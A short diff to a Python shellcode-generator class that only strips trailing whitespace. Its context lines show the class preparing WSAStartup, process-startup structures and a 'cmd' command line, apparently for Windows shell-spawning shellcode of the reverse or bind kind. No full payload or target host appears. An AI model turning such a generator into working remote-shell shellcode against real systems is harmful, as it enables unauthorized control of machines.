@@ -74,11 +74,11 @@ class Shellcode():
 
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
-            "wsaData"              : 0x00, 
+            "wsaData"              : 0x00,
             "name"                 : 0x00,
             "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
             "lpCommandLine"        : len("cmd\x00\x00\x00\x00\x00"),
-            "lpProcessInformation" : 0x00, 
+            "lpProcessInformation" : 0x00,
        })
 
         self.stack_space = builder.calc_stack_space(sc_args)
@@ -185,7 +185,7 @@ error:
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
             src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
@@ -261,7 +261,7 @@ _start:
 """
 
         shellcode += self.resolve_functions()
-        
+
         shellcode += f"""
 ; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX
 ;                   [out] LPWSADATA lpWSAData);       // RDX
